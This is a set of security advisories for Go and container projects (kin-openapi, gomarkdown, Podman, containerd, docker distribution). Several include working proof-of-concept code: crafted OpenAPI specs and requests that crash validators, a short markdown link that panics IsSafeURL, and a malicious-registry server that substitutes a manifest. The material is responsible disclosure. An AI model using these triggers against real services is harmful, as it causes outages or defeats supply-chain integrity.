## Summary

`ValidateResponse` panics on a nil pointer when a spec declares a response header with `content` instead of `schema`. `doc.Validate()` accepts that document, so the crash comes from a spec the library just called valid.

Same class as GHSA-jpcw-4wr7-c3vq, which covered the request-parameter case in v0.144.0; this is the response-header path.

Affects `github.com/getkin/kin-openapi` `<= v0.145.0`. Reproduced on master `947498e5a6bd`, Go 1.26.

## Details

A `content`-typed response header has `headerRef.Value.Schema == nil`.

`validate_response.go:181` passes it straight through:

```go
if decodedValue, found, err = decodeValue(dec, headerName, sm, headerRef.Value.Schema, headerRef.Value.Required); err != nil {
```

and `req_resp_decoder.go:273` is where it lands:

```go
if len(schema.Value.AllOf) > 0 {
```

Two things I checked rather than assumed. The response does not need to carry the header; declaring it is enough, and then every call for that operation panics. And the body path is fine, `:114` returns early on a nil schema, so this is headers only. The PoC keeps the body case as a control.

## PoC

Drop into `openapi3filter/` and run:

```
go test ./openapi3filter/ -run NilSchema -v
```

```go
package openapi3filter_test

import (
	"context"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/getkin/kin-openapi/openapi3"
	"github.com/getkin/kin-openapi/openapi3filter"
	"github.com/getkin/kin-openapi/routers"
)

const specBody = `
openapi: 3.0.3
info: {title: poc, version: "1.0.0"}
paths:
  /x:
    get:
      responses:
        "200":
          description: ok
          content:
            application/json: {}
`

const specHeader = `
openapi: 3.0.3
info: {title: poc, version: "1.0.0"}
paths:
  /x:
    get:
      responses:
        "200":
          description: ok
          headers:
            X-Thing:
              content:
                application/json: {}
`

func validatedInput(t *testing.T, spec string, hdr http.Header) *openapi3filter.ResponseValidationInput {
	t.Helper()
	doc, err := openapi3.NewLoader().LoadFromData([]byte(spec))
	if err != nil {
		t.Fatalf("load: %v", err)
	}
	if err := doc.Validate(context.Background()); err != nil {
		t.Fatalf("doc.Validate rejected the spec, so this repro proves nothing: %v", err)
	}
	op := doc.Paths.Find("/x").Get
	req := httptest.NewRequest(http.MethodGet, "/x", nil)
	return &openapi3filter.ResponseValidationInput{
		RequestValidationInput: &openapi3filter.RequestValidationInput{
			Request: req,
			Route:   &routers.Route{Spec: doc, Operation: op, Method: http.MethodGet, Path: "/x"},
		},
		Status: 200,
		Header: hdr,
		Body:   io.NopCloser(strings.NewReader(`{}`)),
	}
}

// Control: body path returns early on a nil schema.
func TestControl_ResponseBodyNilSchema(t *testing.T) {
	in := validatedInput(t, specBody, http.Header{"Content-Type": {"application/json"}})
	defer func() {
		if r := recover(); r != nil {
			t.Errorf("body path panicked, expected clean return: %v", r)
		}
	}()
	if err := openapi3filter.ValidateResponse(context.Background(), in); err != nil {
		t.Errorf("body path returned %v, expected nil", err)
	}
}

// The response does not carry X-Thing. Declaring the header is enough.
func TestResponseHeaderNilSchema(t *testing.T) {
	in := validatedInput(t, specHeader, http.Header{"Content-Type": {"application/json"}})
	if err := openapi3filter.ValidateResponse(context.Background(), in); err != nil {
		t.Fatalf("no panic; got err = %v (already fixed?)", err)
	}
}
```

Output:

```
=== RUN   TestControl_ResponseBodyNilSchema
--- PASS: TestControl_ResponseBodyNilSchema (0.00s)
=== RUN   TestResponseHeaderNilSchema
--- FAIL: TestResponseHeaderNilSchema (0.00s)
panic: runtime error: invalid memory address or nil pointer dereference [recovered, repanicked]
[signal SIGSEGV: segmentation violation code=0x1 addr=0x20 pc=0x7f6d2a]

github.com/getkin/kin-openapi/openapi3filter.decodeValue(...)
	/src/openapi3filter/req_resp_decoder.go:273 +0x4a
github.com/getkin/kin-openapi/openapi3filter.validateResponseHeader(...)
	/src/openapi3filter/validate_response.go:181 +0x146
github.com/getkin/kin-openapi/openapi3filter.ValidateResponse(...)
	/src/openapi3filter/validate_response.go:89 +0xafa
```

The `FAIL` is the point: control passes, the header case takes the binary down.

Ran in a container against a fresh clone of master. I have not tried it against a live proxy.

## Impact

A process crash instead of an error return. Declaring the header is enough, so it is every call on that operation rather than an occasional one.

If the spec comes from somewhere else -- gateways, linters, anything ingesting specs it did not write -- that is a trust boundary, and it becomes remote availability.

If it is your own spec, nothing attacker-controlled starts it, but any client reaching that route then crashes the process. It fires on every call, so normally you would see it the first time that route runs. A spec edited without exercising the route is the case where you would not. That is the difference from GHSA-jpcw, where the attacker supplied the trigger. I have left severity unset; the two cases do not score the same.

On how common it is, I checked rather than guessed. Of roughly 1,500 OpenAPI 3.x specs on apis.guru, one declares content-typed response headers -- VTEX Catalog API -- and not in one corner of it: the shape repeats across its operations, so for that consumer this is not an edge case.

The header names in it (`X-AspNet-Version`, `p3p`, a few malformed ones) look like a generator emitting `content` where it could not infer a schema, and apis.guru only indexes public specs. There is no content-typed response header in this repo's testdata either.

## Workarounds

Use `schema` on the response header, or skip `ValidateResponse` for those operations. `ExcludeResponseBody` will not do it -- headers are validated before that check.

## Suggested fix

Nil-guard at the top of `decodeValue`:

```go
if schema == nil {
	return nil, false, nil
}
```

Returning nil leaves a `content`-typed header unvalidated rather than erroring, so it trades the crash for a silent gap. An error return kills the panic just as well if you would rather it surfaced.
body.summary: kin-openapi openapi3filter: nil-pointer panic in ValidateResponse on a response header declared with content

## Summary

IsSafeURL slices url[:nPath] before checking that len(url) >= nPath, so a URL shorter than a path prefix (0, 1 or 2 bytes) triggers a slice-bounds panic, and this is reached end to end when the html.Safelink hardening flag is enabled and the input contains an empty or very short link destination, giving an unrecoverable crash DoS. Confirmed at HEAD (e08cff8; present since 2022).

## The defect

parser/parser.go, IsSafeURL:

```go
func IsSafeURL(url []byte) bool {
    nLink := len(url)
    for _, path := range validPaths {          // "/", "./", "../"
        nPath := len(path)
        linkPrefix := url[:nPath]               // line 789: sliced BEFORE the length guard
        if nLink >= nPath && bytes.Equal(linkPrefix, path) {   // line 790: guard is too late
            ...
```

url[:nPath] is evaluated before the `nLink >= nPath` check. When len(url) < nPath and cap(url) < nPath, the slice expression panics. Only the relative-path loop is affected; the adjacent URIs loop is already correctly guarded (the signal that this one deviates, the same signal as the anchor). Input: IsSafeURL("") panics ([:1] cap 0), IsSafeURL(".") panics ([:2] cap 1), IsSafeURL("..") panics ([:3] cap 2), while IsSafeURL("/") returns true. End to end: `markdown.ToHTML(input, html.CommonFlags|html.Safelink)` with input `[x]()` panics. Attacker model: (1) any service rendering untrusted Markdown with the html.Safelink flag (the URL-sanitizing hardening flag itself introduces the crash); or (2) any downstream that calls the exported parser.IsSafeURL on a 0/1/2-byte attacker URL, no flag required. No recover() anywhere, so an uncaught crash of the calling goroutine.

## Verification

EXECUTED with negative controls. Direct: the empty/1/2-char cases panic with the exact slice-bounds message while "/" returns true. End to end via ToHTML with html.CommonFlags|html.Safelink: `[x]()` panics, while `[x](/)`, `[x](http://example.com)`, plain text, and `[x](javascript:alert(1))` (safely dropped) do not. NOT verified: how many downstream apps enable Safelink or call IsSafeURL directly (the default no-Safelink render path does not reach it).

## Suggested fix

Move the slice inside the guard: check `nLink >= nPath` first, then compute url[:nPath] (or use bytes.HasPrefix(url, path), which is length-safe). One-line change, mirroring the already-correct URIs loop.

Also checked and sound: CVE-2026-40890 (smartypants smartLeftAngle OOB) is fixed; CVE-2024-44337 (list/paragraph infinite loop) is fixed (deep nesting capped at maxNesting=64); default XSS is by design (Safelink/SkipHTML not in CommonFlags).

## Tooling

AI assistance was used while investigating. The panic is executed-verified with negative controls (IsSafeURL on empty/./.. panics with a slice-bounds error while "/" returns true; ToHTML with html.Safelink on `[x]()` panics while valid and javascript: links do not), and I confirmed at HEAD that IsSafeURL computes url[:nPath] before the `nLink >= nPath` guard.
body.summary: gomarkdown/markdown IsSafeURL panics on short URLs

### Impact
Podman v4.4.0 added a feature where container checkpoints (from the `podman container checkpoint` command) could be distributed via OCI registry, and pulled from that registry and run via the `podman run` command. This allowed easy transfer of checkpoints between systems. However, checkpoints allow complete control of how the container is created - including full control of the container sandbox. When `podman run` detects a checkpoint, it will silently ignore all user input regarding how the container should be created - for example, `podman run --cap-drop=ALL` on an image that is determined to be a checkpoint will ignore `--cap-drop=all` and use the set of capabilities specified by the checkpoint image instead, which could include all capabilities. Podman identifies checkpoint images by looking for an annotation, `io.podman.annotations.checkpoint.runtime.name`. If this annotation is set, the image is treated as a checkpoint. Conflating container images and checkpoints in `podman run` allows inherently insecure behavior as the image can now control how it is executed. The Podman Maintainers have determined that the safest course of action is to remove this functionality.

### Patch
The commit introducing this functionality was reverted.

3721ff82ffb44a4ceeaecc5abd3808e924a6b669 c74b1d37b3fb834b0de43e176565d9d8c254b627 fa6cef22c2baf3987b581c673bb416ef0585daf7 (main)

body.description:
### Summary

File pattern filters (`denied_patterns` / `allowed_patterns`) were evaluated on the destination of a copy only. A user holding the copy permission could copy a file denied by the filters to a permitted name and then read it. A recursive directory copy reproduced the contents of a restricted directory under a path where the filters do not deny them, and the hide policy was affected in the same way: a file reported as missing by stat and by directory listings could still be copied.

### Details

An authenticated user can read the contents of files that the file pattern filters are configured to deny them. Nothing else is bypassed: the home directory, the virtual folder layout and the per-directory permissions are all still enforced, and both ends of the copy are paths the account can already reach. No access to other accounts and no administrative capability.

body.description:
### Impact

A vulnerability exists in containerd's layer unpack handler where the processing of certain image layers causes superlinear time complexity. During the unpack operation, specific file configurations within the layer can trigger repeated directory traversals.

Consequently, pulling or importing a maliciously crafted image can result in increased unpack times and a moderate increase in CPU usage. This delays container startup, even if the compressed image layers are small. Additionally, in orchestrators like Kubernetes that apply concurrency limits to image pulls, these excessively long operations can reduce the available concurrency for other pulls, potentially delaying unrelated container deployments.

### Patches

This bug has been fixed in containerd 2.3.5, 2.2.8, 2.0.12, and 1.7.35. Users should update to these versions to resolve the issue.

### Workarounds

There are no known workarounds for this issue. Users are advised to only pull and import trusted images from known registries until the patch can be applied.

The containerd project would like to thank Jakub Ciolek of AlphaSense for responsibly disclosing this issue in accordance with the [containerd security policy](https://github.com/containerd/project/blob/main/SECURITY.md).

body.description:
### Summary

`registry/client.(*manifests).Get(ctx, dgst, …)` fetches a manifest by digest but never hashes the returned body and compares it against the requested digest. A malicious or compromised registry, or any MITM on the registry connection, can serve arbitrary manifest bytes in response to a digest-pinned request and the client returns the substituted content transparently to the caller. Any application relying on digest pinning for supply-chain integrity — image policy controllers, mirrors, pull-through caches — is silently undermined. The bundled pull-through proxy (`registry/proxy/proxymanifeststore.go`) is itself an unguarded consumer and is directly exploitable.

### Details

**Root cause:** `registry/client/repository.go:488-505` reads the response body and passes it directly to `distribution.UnmarshalManifest` without ever computing `digest.FromBytes(body)` and comparing against the caller-supplied `dgst`. The `Docker-Content-Digest` response header is parsed (lines 251-292 in `descriptorFromResponse`) only to populate an out-parameter (`ReturnContentDigest`) and is itself server-supplied — it is never recomputed from the body, so a lying server can set it to whatever value the caller requested while delivering different bytes.

**Attack path:** An attacker who controls the registry endpoint (malicious registry, compromised upstream, DNS hijack, or TLS MITM) responds to `GET /v2/{name}/manifests/{digest}` with:
1. `Docker-Content-Digest: <requested-digest>` (forged header)
2. A body containing a different, attacker-chosen manifest

The client calls `distribution.UnmarshalManifest` on the substituted body, returns the attacker's manifest as if it were the pinned content, and the caller has no way to detect the substitution.

**Why it matters:** The entire value of digest pinning is to guarantee content-addressable integrity against exactly this threat model (hostile or MITM server). The `registry/proxy/proxymanifeststore.go:42-87` pull-through cache calls `remoteManifests.Get(ctx, dgst)` and immediately writes the result to local storage with no re-verification — so a poisoned remote can permanently inject a bad manifest into the mirror cache, affecting all subsequent consumers.

Relevant code path (`repository.go`, simplified):
```go
// line ~496
func (ms *manifests) Get(ctx context.Context, dgst digest.Digest, options ...distribution.ManifestServiceOption) (distribution.Manifest, error) {
    ...
    resp, err := ms.client.Get(u)
    ...
    body, err := ioutil.ReadAll(resp.Body)  // no size limit, no digest check
    ...
    m, _, err := distribution.UnmarshalManifest(ct, body)  // returns attacker bytes
    return m, err
}
```

### PoC

**go.mod:**
```
module poc

go 1.24.10

require (
        github.com/distribution/reference v0.6.0
        github.com/docker/distribution v2.8.3+incompatible
        github.com/opencontainers/go-digest v1.0.0
)

require (
        github.com/beorn7/perks v1.0.1 // indirect
        github.com/docker/go-metrics v0.0.1 // indirect
        github.com/docker/libtrust v0.0.0-20160708172513-aabc10ec26b7 // indirect
        github.com/golang/protobuf v1.3.2 // indirect
        github.com/gorilla/mux v1.8.1 // indirect
        github.com/matttproud/golang_protobuf_extensions v1.0.1 // indirect
        github.com/opencontainers/image-spec v1.1.1 // indirect
        github.com/prometheus/client_golang v1.1.0 // indirect
        github.com/prometheus/client_model v0.0.0-20190129233127-fd36f4220a90 // indirect
        github.com/prometheus/common v0.6.0 // indirect
        github.com/prometheus/procfs v0.0.3 // indirect
        github.com/sirupsen/logrus v1.9.4 // indirect
        golang.org/x/sys v0.13.0 // indirect
)
```

**main.go:**
```go
// PoC: registry/client manifests.Get() does not verify the requested digest
// against the returned body. A malicious registry (or MITM) can serve
// arbitrary content for a digest-pinned manifest reference and the client
// will accept it.
package main

import (
        "context"
        "fmt"
        "net/http"
        "net/http/httptest"

        "github.com/distribution/reference"
        "github.com/docker/distribution/manifest/schema2"
        "github.com/docker/distribution/registry/client"
        "github.com/opencontainers/go-digest"
)

// A real, "trusted" manifest the user pinned by digest.
var trustedManifest = []byte(`{
   "schemaVersion": 2,
   "mediaType": "application/vnd.docker.distribution.manifest.v2+json",
   "config": {"mediaType": "application/vnd.docker.container.image.v1+json","size": 1,"digest": "sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"},
   "layers": []
}`)

// A different, attacker-controlled manifest the malicious server returns instead.
var evilManifest = []byte(`{
   "schemaVersion": 2,
   "mediaType": "application/vnd.docker.distribution.manifest.v2+json",
   "config": {"mediaType": "application/vnd.docker.container.image.v1+json","size": 1,"digest": "sha256:eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee"},
   "layers": []
}`)

func main() {
        pinnedDigest := digest.FromBytes(trustedManifest)
        evilDigest := digest.FromBytes(evilManifest)
        fmt.Println("client requests manifest pinned at:", pinnedDigest)
        fmt.Println("server will instead return content :", evilDigest)

        srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
                // Lie: claim the digest matches what was asked, but serve evil bytes.
                w.Header().Set("Content-Type", schema2.MediaTypeManifest)
                w.Header().Set("Docker-Content-Digest", pinnedDigest.String())
                w.WriteHeader(200)
                w.Write(evilManifest)
        }))
        defer srv.Close()

        name, _ := reference.WithName("library/alpine")
        repo, err := client.NewRepository(name, srv.URL, http.DefaultTransport)
        if err != nil {
                panic(err)
        }
        ms, _ := repo.Manifests(context.Background())

        // Fetch by *digest* — caller expects content-addressed integrity.
        m, err := ms.Get(context.Background(), pinnedDigest)
        if err != nil {
                fmt.Println("Get error:", err)
                return
        }
        _, payload, _ := m.Payload()
        got := digest.FromBytes(payload)

        if got != pinnedDigest {
                fmt.Println()
                fmt.Println(">>> BYPASS: client accepted manifest that does NOT match requested digest")
                fmt.Println("    requested:", pinnedDigest)
                fmt.Println("    received :", got)
        } else {
                fmt.Println("OK: digest verified")
        }
}
```

**Output (v2.8.3+incompatible):**
```
client requests manifest pinned at: sha256:224a436131519692201bd7adb1ab9f9cd95ce26ed21ec70e49972dfd222726de
server will instead return content : sha256:a44b526191ae3f0aa16022abcb7fc1103c23534682c39a2dbe18a5a52fc5002e

>>> BYPASS: client accepted manifest that does NOT match requested digest
    requested: sha256:224a436131519692201bd7adb1ab9f9cd95ce26ed21ec70e49972dfd222726de
    received : sha256:a44b526191ae3f0aa16022abcb7fc1103c23534682c39a2dbe18a5a52fc5002e
```

### Impact

Any application that calls `registry/client.(*manifests).Get()` with a digest argument — and relies on that digest to guarantee which image content it receives — is affected. This includes image policy controllers that enforce allowed digests, pull-through cache/mirror implementations (including the bundled `registry/proxy`), and any CI/CD tooling that pins images by digest for reproducibility or security.

An attacker who controls or can MITM the registry endpoint can substitute arbitrary manifest content — changing image layers, entrypoints, or referenced blobs — and the client will accept and act on the substituted content without warning. The bundled pull-through proxy will cache and re-serve the poisoned manifest to all downstream clients.

Exploitation requires either control of the registry endpoint the victim is configured to use, or a MITM/TLS-breaking position on that connection. No authentication is needed beyond whatever the registry normally requires.
body.summary: Distribution: Client `manifests.Get()` does not verify returned content against requested digest

body.description:
### Impact

A vulnerability in containerd's CRI implementation allows a container restored from an untrusted checkpoint via the `CreateContainer` API to bypass the destination security context and execute with elevated privileges. When restoring a container from a checkpoint archive or annotated OCI image, CRIU restores process credentials, Linux capabilities, `no_new_privs`, and seccomp state directly from checkpoint data rather than enforcing the destination CRI `ContainerConfig`. An attacker who can run a container with a crafted checkpoint image can execute processes as root with full capabilities and no enforced seccomp filters despite restrictive security policies requested by the orchestrator. Additionally, containerd's CRI status reporting reflects the requested configuration rather than the actual restored process state, masking the privilege discrepancy from orchestrators. This issue affects Linux systems running containerd with CRI checkpoint restore enabled; users not utilizing CRI checkpoint restore are not affected.

### Patches

This bug has been addressed in containerd 2.2.7 and 2.3.4 by disabling checkpoint restore via `CreateContainer` by default.  The feature has been removed entirely in containerd 2.4.0. Users should update to these versions to resolve the issue. Running containers that were restored from untrusted checkpoints should be stopped, deleted, and recreated.

Users who rely on restore via the `CreateContainer` API can re-enable the feature by setting the new `enable_experimental_restore_via_create` configuration option. However, enabling restore via `CreateContainer` leaves this vulnerability present, as containerd cannot enforce destination security policy during CRIU process restoration. 

### Workarounds

On unpatched versions, containerd does not provide a configuration option to disable checkpoint restore via `CreateContainer`. Deployments should restrict container creation permissions to trusted users, validate container image registries, or use admission controllers to reject images containing checkpoint data.

### References

* [CRIU image security](https://checkpoint-restore.github.io/criu/security/image-security.html)

### Credits

The containerd project would like to thank @l2yyd5 and @berkpolatCE for responsibly disclosing this issue in accordance with the [containerd security policy](https://github.com/containerd/project/blob/main/SECURITY.md).

### For more information

If you have any questions or comments about this advisory:

* Open an issue in [containerd](https://github.com/containerd/containerd/issues/new/choose)
* Email us at [security@containerd.io](mailto:security@containerd.io)

To report a security issue in containerd:
* [Report a new vulnerability](https://github.com/containerd/containerd/security/advisories/new)

body.description:
## Summary

The fix for GHSA-p6wj-qrr4-pgh5 addressed a nil-pointer dereference that occurs when an OpenAPI 3.1 array schema omits the `items` keyword (which is legal under JSON Schema 2020-12). That fix patched three decoder paths: the standalone `parseArray` function, the top-level array check in `UrlencodedBodyDecoder`, and `MultipartBodyDecoder`.

Three additional crash paths were missed. All of them reach the unguarded `urlValuesDecoder.parseArray` method (`openapi3filter/req_resp_decoder.go:576`) or the unguarded array branch in `buildResObj` (line 1015):

1. **Query parameters** with `type: array` and no `items`.
2. **deepObject** query parameters containing an array property with no `items`.
3. **URL-encoded request bodies** where the array lives inside an `allOf` / `anyOf` / `oneOf` sub-schema. This path bypasses the guard added by the GHSA-p6wj-qrr4-pgh5 fix, because that guard only inspects top-level properties.

Each path is triggerable by an unauthenticated client and produces a deterministic nil-pointer panic during request validation.

## Details
### Root Cause

The three paths patched for GHSA-p6wj-qrr4-pgh5 each received a nil-`items` guard:

```go
// standalone parseArray (line 1143) -- GUARDED
func parseArray(raw []string, schemaRef *openapi3.SchemaRef) ([]any, error) {
	if schemaRef.Value.Items == nil || schemaRef.Value.Items.Value == nil { ... }

// UrlencodedBodyDecoder top-level property loop (line 1441) -- GUARDED
if propSchema.Value.Items == nil || propSchema.Value.Items.Value == nil { ... }

// MultipartBodyDecoder (line 1587) -- GUARDED
if valueSchema.Value.Items == nil { ... }
```

But `urlValuesDecoder.parseArray` (line 576), which handles query-parameter and urlencoded-body array decoding, has **no** such guard:

```go
func (d *urlValuesDecoder) parseArray(raw []string, schemaRef *openapi3.SchemaRef) ([]any, error) {
	var value []any
	for i, v := range raw {
		item, err := d.parseValue(v, schemaRef.Value.Items) // Items is nil -> panic in parseValue
```

`parseValue` immediately dereferences the schema it is handed:

```go
func (d *urlValuesDecoder) parseValue(v string, schema *openapi3.SchemaRef) (any, error) {
	if len(schema.Value.AllOf) > 0 {   // schema == nil here -> nil pointer dereference
```

For the deepObject path, `buildResObj` (line 1015) has the same gap. Its array branch recurses with `schema.Value.Items` (line 1028), which can be nil, and the recursive call dereferences it at line 1015:

```go
case schema.Value.Type.Is("array"):
	// ...
	for i := range arr {
		r, err := buildResObj(params, mapKeys, strconv.Itoa(i), schema.Value.Items) // nil Items
```

For the allOf body path, `UrlencodedBodyDecoder` validates only top-level `schema.Value.Properties` (line 1429-1449). But `decodeSchemaConstructs` (line 1474) recursively walks `AllOf` / `AnyOf` / `OneOf` sub-schemas and calls `decodeProperty` on their properties, which never pass through the top-level guard and reach `urlValuesDecoder.parseArray`.

## Proof of Concept

### Environment

- kin-openapi v0.144.0 (cloned at tag `v0.144.0`, commit `f0407d5`)
- Go 1.26.7
- Each PoC calls `doc.Validate()` first to prove the spec is legal, then drives `openapi3filter.ValidateRequest` directly

### Path 1: Query parameter array without items

Spec (query param `ids` is `type: array`, no `items`), request `GET /test?ids=1&ids=2`:

```
Validate() ACCEPTED the spec (type: array with no items is legal under OAS 3.1)
Calling ValidateRequest directly (no net/http recover)...
panic: runtime error: invalid memory address or nil pointer dereference
[signal 0xc0000005 code=0x0 addr=0x20 ...]
github.com/getkin/kin-openapi/openapi3filter.(*urlValuesDecoder).parseValue(...)
	req_resp_decoder.go:605
github.com/getkin/kin-openapi/openapi3filter.(*urlValuesDecoder).parseArray(...)
	req_resp_decoder.go:580
github.com/getkin/kin-openapi/openapi3filter.(*urlValuesDecoder).DecodeArray(...)
	req_resp_decoder.go:569
...
github.com/getkin/kin-openapi/openapi3filter.ValidateRequest(...)
	validate_request.go:83
exit status 2
```

### Path 2: deepObject nested array without items

Spec (deepObject param `filter` with array property `tags`, no `items`), request `GET /test?filter[tags][0]=a`:

```
Validate() ACCEPTED the spec
Calling ValidateRequest directly...
panic: runtime error: invalid memory address or nil pointer dereference
github.com/getkin/kin-openapi/openapi3filter.buildResObj(...)
	req_resp_decoder.go:1012
github.com/getkin/kin-openapi/openapi3filter.buildResObj(...)   <- recursive call with nil Items
	req_resp_decoder.go:1028
github.com/getkin/kin-openapi/openapi3filter.makeObject(...)
	req_resp_decoder.go:947
...
exit status 2
```

### Path 3: URL-encoded body with array inside allOf (bypasses the existing fix)

Spec (urlencoded body, `allOf` sub-schema with array property `tags`, no `items`), request `POST /submit` body `tags=a&tags=b`:

```
Validate() ACCEPTED the spec
Calling ValidateRequest directly...
panic: runtime error: invalid memory address or nil pointer dereference
github.com/getkin/kin-openapi/openapi3filter.(*urlValuesDecoder).parseValue(...)
	req_resp_decoder.go:605
github.com/getkin/kin-openapi/openapi3filter.(*urlValuesDecoder).parseArray(...)
	req_resp_decoder.go:580
github.com/getkin/kin-openapi/openapi3filter.(*urlValuesDecoder).DecodeArray(...)
	req_resp_decoder.go:569
...
github.com/getkin/kin-openapi/openapi3filter.decodeProperty(...)   <- reached via decodeSchemaConstructs (allOf walker)
	req_resp_decoder.go:1519
exit status 2
```

The `decodeProperty` frame confirms the array was reached by walking the `allOf` sub-schema, bypassing the top-level guard that the GHSA-p6wj-qrr4-pgh5 fix added.

### Fix verification

Adding a single nil-`items` guard to `urlValuesDecoder.parseArray` (plus one to the `buildResObj` array branch) turns all three panics into clean validation errors:

```
poc1: Returned normally, err = parameter "ids" in query has an error: array items schema is required for decoding
poc2: Returned normally, err = parameter "filter" in query has an error: path tags: array items schema is required
poc3: Returned normally, err = <nil>   (no panic; the allOf property is skipped by the decoder)
```

This confirms `urlValuesDecoder.parseArray` is the shared root cause for Paths 1 and 3, and `buildResObj` for Path 2.

## Impact

An unauthenticated client can trigger a deterministic nil-pointer panic in request validation with a single crafted request, against any application that validates OAS 3.1 requests with `openapi3filter` where a spec declares an array without `items`.

The severity depends on the host:

| Deployment | Behavior | Availability impact |
|------------|----------|---------------------|
| Standard `net/http` server (validation runs in the handler goroutine) | `net/http` recovers the panic per-connection; the connection is dropped and the process survives | Per-request denial of service (A:L) |
| Non-`net/http` hosts (e.g. fasthttp/connect adapters) or validation performed in an application-spawned goroutine | The panic is not recovered; the process crashes | Full-process denial of service (A:H) |

This was verified in both configurations: under a live `net/http` server the process survived (the panic was logged as `http: panic serving ...` and the process exited 0 at end of test), while the direct-call PoCs above crashed the process with `exit status 2`.
body.summary: kin-openapi: Incomplete Fix for GHSA-p6wj-qrr4-pgh5: Three Unpatched nil-Items Panic Paths in openapi3filter

body.description:
## Summary

kin-openapi's spec loader and spec-time validator both handle circular schema references safely: the loader resolves circular `$ref`s on purpose (to support recursive data structures), and `Schema.validate()` uses stack-based cycle detection. `Validate()` therefore accepts a schema whose `allOf` / `anyOf` / `oneOf` chain refers back to itself, returning no error.

The runtime validators do not have that protection. When such a schema is used for request or response validation, the recursion through the combinator chain is unbounded. In Go this produces a **fatal stack overflow** (`runtime: goroutine stack exceeds ... limit` / `fatal error: stack overflow`), which is **not** a recoverable panic. `recover()` cannot catch it, so `net/http`'s per-connection recovery does not help. The entire process is terminated, including all goroutines serving unrelated clients.

Two independent unguarded recursion sites were confirmed:

1. `openapi3/schema.go` — `visitJSON` / `visitXOFOperations` (reached by `VisitJSON`, i.e. response validation and direct schema validation).
2. `openapi3filter/req_resp_decoder.go` — `decodeValue` (reached first during request parameter decoding). The report also identifies the same gap in `urlValuesDecoder.parseValue` and `buildResObj`/`buildFromSchemas`.

## Details 
### Root Cause

`Schema.validate()` has cycle detection (`openapi3/schema.go:1396`):

```go
func (schema *Schema) validate(ctx context.Context, stack []*Schema) ([]*Schema, error) {
	if slices.Contains(stack, schema) {
		return stack, nil
	}
	// ...
	stack = append(stack, schema)
```

The runtime visitor has none. `visitJSON` (line 1951) calls `visitXOFOperations` (line 2189), which iterates the combinator slice and calls `visitJSON` again on each sub-schema:

```go
func (schema *Schema) visitXOFOperations(settings *schemaValidationSettings, value any) (err error, run bool) {
	// ...
	for idx, item := range v { // v = schema.OneOf / AnyOf / AllOf
		v := item.Value
		// no check for item.Value == schema (or any ancestor)
		if err := v.visitJSON(settings, tempValue); err != nil { // recurses forever on a cycle
```

The request-decoding path has the same structure in `decodeValue` (`openapi3filter/req_resp_decoder.go:270`):

```go
func decodeValue(dec valueDecoder, param string, sm *openapi3.SerializationMethod, schema *openapi3.SchemaRef, required bool) (any, bool, error) {
	if len(schema.Value.AllOf) > 0 {
		for _, sr := range schema.Value.AllOf {
			value, f, err = decodeValue(dec, param, sm, sr, required) // no cycle check
```

## Proof of Concept

### Environment

- kin-openapi v0.144.0 (tag `v0.144.0`, commit `f0407d5`)
- Go 1.26.7

### Path A: response / direct schema validation (`VisitJSON`)

A schema whose `allOf` refers to itself. `Validate()` is called first to show the schema is accepted, then `VisitJSON()`:

```go
recursiveSchema := &openapi3.Schema{
	Type:       &openapi3.Types{"object"},
	Properties: openapi3.Schemas{"name": {Value: &openapi3.Schema{Type: &openapi3.Types{"string"}}}},
}
recursiveSchema.AllOf = openapi3.SchemaRefs{{Value: recursiveSchema}} // circular

_ = recursiveSchema.Validate(ctx)                       // accepted, no error
_ = recursiveSchema.VisitJSON(map[string]any{"name": "test"}) // crashes
```

Output:

```
Validate() ACCEPTED the circular schema (no error) -- spec-time cycle detection tolerates it
Calling VisitJSON() -- expect fatal stack overflow (unrecoverable)...
runtime: goroutine stack exceeds 1000000000-byte limit
fatal error: stack overflow

goroutine 1 [running]:
github.com/getkin/kin-openapi/openapi3.(*Schema).visitJSON(...)
	openapi3/schema.go:1951
github.com/getkin/kin-openapi/openapi3.(*Schema).visitXOFOperations(...)
	openapi3/schema.go:2309
github.com/getkin/kin-openapi/openapi3.(*Schema).visitJSON(...)
	openapi3/schema.go:1981
github.com/getkin/kin-openapi/openapi3.(*Schema).visitXOFOperations(...)
	openapi3/schema.go:2309
... (repeats until stack overflow)
```

A `defer recover()` placed around the call did **not** catch the fatal error — the process aborted with a non-zero exit code, confirming it is unrecoverable.

### Path B: HTTP request validation against a loaded spec (realistic delivery)

A legal OAS 3.0 spec with a circular `allOf` `$ref`, loaded normally, served behind a standard `net/http` handler using `openapi3filter.ValidateRequest`:

```yaml
openapi: '3.0.0'
info: { title: Circular allOf crash PoC, version: '1.0' }
paths:
  /test:
    get:
      parameters:
        - name: data
          in: query
          schema: { $ref: '#/components/schemas/Recursive' }
      responses: { '200': { description: OK } }
components:
  schemas:
    Recursive:
      type: object
      allOf:
        - $ref: '#/components/schemas/Recursive'
      properties:
        name: { type: string }
```

A single `GET /test?data=x` crashes the whole server process:

```
Validate() ACCEPTED the spec with circular allOf $ref
Sending GET /test?data=x through a real net/http server...
runtime: goroutine stack exceeds 1000000000-byte limit
fatal error: stack overflow
...
github.com/getkin/kin-openapi/openapi3filter.decodeValue(...)
	openapi3filter/req_resp_decoder.go:278
github.com/getkin/kin-openapi/openapi3filter.decodeValue(...)
	openapi3filter/req_resp_decoder.go:278
... (repeats until stack overflow)
```

The line printed after the request ("the process survived") was never reached, and the process exited with a non-zero code — the standard `net/http` per-connection `recover()` did not save it. This is the key distinction from a recoverable panic: a fatal stack overflow takes the entire process down regardless of host.

### Fix verification

Adding stack-based cycle detection to both sites (matching `validate()`'s pattern) eliminated the crash:

- `visitJSON` guard: `VisitJSON()` returned normally instead of crashing.
- `decodeValue` guard: the same `GET /test?data=x` returned a clean `400`:

```
Response: 400 "invalid: parameter \"data\" in query has an error: circular schema reference detected while decoding"
If you see this line, the process survived.
```

## Impact

An unrecoverable, whole-process denial of service. Because the crash is a fatal Go runtime error (not a panic), it cannot be contained by `net/http`'s per-request recovery, so **A:H applies to all host types**, unlike a recoverable-panic bug.

Attack surface, in order of exposure:

